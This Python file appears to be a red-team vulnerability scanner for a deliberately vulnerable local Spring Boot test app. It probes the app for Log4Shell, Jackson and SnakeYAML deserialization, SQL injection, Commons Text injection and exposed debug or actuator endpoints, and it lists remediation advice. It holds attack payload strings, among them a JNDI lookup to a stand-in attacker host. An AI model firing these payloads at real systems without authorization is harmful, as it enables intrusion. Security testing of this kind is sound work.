#!/usr/bin/env python3
"""
Red Team Agent - Spring Boot Vulnerability Scanner
Specialized scanner for detecting vulnerabilities in the test Spring Boot application
"""

import asyncio
import aiohttp
import json
import logging
from datetime import datetime
from typing import Dict, List, Any
import subprocess
import os

class SpringBootVulnerabilityScanner:
    def __init__(self, target_url="http://localhost:8080"):
        self.target_url = target_url
        self.vulnerabilities_found = []
        self.logger = logging.getLogger(__name__)
        
    async def scan_log4shell(self, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """Test for Log4Shell vulnerability (CVE-2021-44228)"""
        try:
            payload = {"message": "${jndi:ldap://test.attacker.com/evil}"}
            async with session.post(
                f"{self.target_url}/api/log",
                json=payload,
                timeout=10
            ) as response:
                if response.status == 200:
                    return {
                        "vulnerability": "Log4Shell",
                        "cve": "CVE-2021-44228",
                        "severity": "CRITICAL",
                        "status": "VULNERABLE",
                        "endpoint": "/api/log",
                        "description": "Application is vulnerable to Log4Shell JNDI injection",
                        "remediation": "Update Log4j to version 2.17.0 or newer"
                    }
        except Exception as e:
            self.logger.error(f"Log4Shell test failed: {e}")
        
        return {"vulnerability": "Log4Shell", "status": "UNKNOWN"}
    
    async def scan_deserialization(self, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """Test for unsafe deserialization (CVE-2020-36518)"""
        try:
            payload = '["java.util.HashMap",{"@class":"java.lang.Runtime"}]'
            async with session.post(
                f"{self.target_url}/api/deserialize",
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=10
            ) as response:
                if response.status == 200:
                    return {
                        "vulnerability": "Unsafe Deserialization",
                        "cve": "CVE-2020-36518",
                        "severity": "HIGH",
                        "status": "VULNERABLE",
                        "endpoint": "/api/deserialize",
                        "description": "Application allows unsafe JSON deserialization",
                        "remediation": "Update Jackson to version 2.13.2 or newer and disable default typing"
                    }
        except Exception as e:
            self.logger.error(f"Deserialization test failed: {e}")
        
        return {"vulnerability": "Unsafe Deserialization", "status": "UNKNOWN"}
    
    async def scan_sql_injection(self, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """Test for SQL injection"""
        try:
            payload = "1 OR 1=1--"
            async with session.get(
                f"{self.target_url}/api/user/{payload}",
                timeout=10
            ) as response:
                response_text = await response.text()
                if "User data for ID:" in response_text and "1 OR 1=1--" in response_text:
                    return {
                        "vulnerability": "SQL Injection",
                        "cve": "CWE-89",
                        "severity": "HIGH",
                        "status": "VULNERABLE", 
                        "endpoint": "/api/user/{id}",
                        "description": "Application is vulnerable to SQL injection attacks",
                        "remediation": "Use parameterized queries and input validation"
                    }
        except Exception as e:
            self.logger.error(f"SQL injection test failed: {e}")
        
        return {"vulnerability": "SQL Injection", "status": "UNKNOWN"}
    
    async def scan_script_injection(self, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """Test for script injection via Commons Text (CVE-2022-42889)"""
        try:
            payload = {"template": "${script:javascript:java.lang.Runtime.getRuntime()}"}
            async with session.post(
                f"{self.target_url}/api/template",
                json=payload,
                timeout=10
            ) as response:
                if response.status == 200:
                    return {
                        "vulnerability": "Script Injection",
                        "cve": "CVE-2022-42889",
                        "severity": "HIGH",
                        "status": "VULNERABLE",
                        "endpoint": "/api/template",
                        "description": "Application vulnerable to script injection via Commons Text",
                        "remediation": "Update Commons Text to version 1.10.0 or newer"
                    }
        except Exception as e:
            self.logger.error(f"Script injection test failed: {e}")
        
        return {"vulnerability": "Script Injection", "status": "UNKNOWN"}
    
    async def scan_yaml_deserialization(self, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """Test for YAML deserialization (CVE-2022-1471)"""
        try:
            payload = "test: !!javax.script.ScriptEngineManager []"
            async with session.post(
                f"{self.target_url}/api/yaml",
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=10
            ) as response:
                if response.status == 200:
                    return {
                        "vulnerability": "YAML Deserialization",
                        "cve": "CVE-2022-1471",
                        "severity": "HIGH",
                        "status": "VULNERABLE",
                        "endpoint": "/api/yaml",
                        "description": "Application allows unsafe YAML deserialization",
                        "remediation": "Update SnakeYAML to version 2.0 or newer"
                    }
        except Exception as e:
            self.logger.error(f"YAML deserialization test failed: {e}")
        
        return {"vulnerability": "YAML Deserialization", "status": "UNKNOWN"}
    
    async def scan_information_disclosure(self, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """Test for information disclosure"""
        try:
            async with session.get(f"{self.target_url}/api/debug", timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    if "systemProperties" in data or "environmentVariables" in data:
                        return {
                            "vulnerability": "Information Disclosure",
                            "cve": "CWE-200",
                            "severity": "MEDIUM",
                            "status": "VULNERABLE",
                            "endpoint": "/api/debug",
                            "description": "Application exposes sensitive system information",
                            "remediation": "Remove debug endpoints from production"
                        }
        except Exception as e:
            self.logger.error(f"Information disclosure test failed: {e}")
        
        return {"vulnerability": "Information Disclosure", "status": "UNKNOWN"}
    
    async def scan_exposed_actuators(self, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """Test for exposed actuator endpoints"""
        try:
            async with session.get(f"{self.target_url}/actuator", timeout=10) as response:
                if response.status == 200:
                    return {
                        "vulnerability": "Exposed Actuator Endpoints",
                        "cve": "CWE-200",
                        "severity": "MEDIUM",
                        "status": "VULNERABLE",
                        "endpoint": "/actuator",
                        "description": "Spring Boot actuator endpoints are publicly accessible",
                        "remediation": "Secure actuator endpoints with authentication"
                    }
        except Exception as e:
            self.logger.error(f"Actuator test failed: {e}")
        
        return {"vulnerability": "Exposed Actuator Endpoints", "status": "UNKNOWN"}
    
    async def run_dependency_check(self) -> Dict[str, Any]:
        """Run OWASP Dependency Check on the pom.xml"""
        try:
            result = subprocess.run([
                "mvn", "dependency-check:check", 
                "-f", "vulnerable-app/pom.xml",
                "-DfailBuildOnCVSS=0"
            ], capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                return {
                    "scan": "OWASP Dependency Check",
                    "status": "COMPLETED",
                    "severity": "INFO",
                    "description": "Dependency vulnerability scan completed",
                    "report_location": "vulnerable-app/target/dependency-check-report.html"
                }
            else:
                return {
                    "scan": "OWASP Dependency Check",
                    "status": "FAILED",
                    "severity": "WARNING",
                    "error": result.stderr
                }
        except Exception as e:
            return {
                "scan": "OWASP Dependency Check",
                "status": "ERROR",
                "error": str(e)
            }
    
    async def run_full_scan(self) -> Dict[str, Any]:
        """Run complete vulnerability assessment"""
        self.logger.info(f"🔴 RED TEAM: Starting comprehensive scan of {self.target_url}")
        
        scan_results = {
            "timestamp": datetime.now().isoformat(),
            "target": self.target_url,
            "scan_type": "Spring Boot Vulnerability Assessment",
            "vulnerabilities": [],
            "summary": {}
        }
        
        # Web application tests
        async with aiohttp.ClientSession() as session:
            tests = [
                self.scan_log4shell(session),
                self.scan_deserialization(session),
                self.scan_sql_injection(session),
                self.scan_script_injection(session),
                self.scan_yaml_deserialization(session),
                self.scan_information_disclosure(session),
                self.scan_exposed_actuators(session)
            ]
            
            results = await asyncio.gather(*tests, return_exceptions=True)
            
            for result in results:
                if isinstance(result, dict) and result.get("status") == "VULNERABLE":
                    scan_results["vulnerabilities"].append(result)
        
        # Dependency check
        dependency_result = await self.run_dependency_check()
        scan_results["dependency_check"] = dependency_result
        
        # Generate summary
        critical = len([v for v in scan_results["vulnerabilities"] if v.get("severity") == "CRITICAL"])
        high = len([v for v in scan_results["vulnerabilities"] if v.get("severity") == "HIGH"])
        medium = len([v for v in scan_results["vulnerabilities"] if v.get("severity") == "MEDIUM"])
        
        scan_results["summary"] = {
            "total_vulnerabilities": len(scan_results["vulnerabilities"]),
            "critical": critical,
            "high": high,
            "medium": medium,
            "risk_score": (critical * 10) + (high * 7) + (medium * 4)
        }
        
        self.logger.info(f"🔴 RED TEAM: Scan completed. Found {len(scan_results['vulnerabilities'])} vulnerabilities")
        
        # Save results
        with open("red-team-scan-results.json", "w") as f:
            json.dump(scan_results, f, indent=2)
        
        return scan_results

async def main():
    logging.basicConfig(level=logging.INFO)
    scanner = SpringBootVulnerabilityScanner()
    
    print("🔴 RED TEAM: Spring Boot Vulnerability Scanner")
    print("=" * 50)
    
    results = await scanner.run_full_scan()
    
    print(f"\n📊 SCAN RESULTS:")
    print(f"Target: {results['target']}")
    print(f"Vulnerabilities found: {results['summary']['total_vulnerabilities']}")
    print(f"Critical: {results['summary']['critical']}")
    print(f"High: {results['summary']['high']}")
    print(f"Medium: {results['summary']['medium']}")
    print(f"Risk Score: {results['summary']['risk_score']}")
    
    if results['vulnerabilities']:
        print(f"\n🚨 VULNERABILITIES DETECTED:")
        for vuln in results['vulnerabilities']:
            print(f"  • {vuln['vulnerability']} ({vuln['cve']}) - {vuln['severity']}")
    
    print(f"\n📄 Full report saved to: red-team-scan-results.json")

if __name__ == "__main__":
    asyncio.run(main())
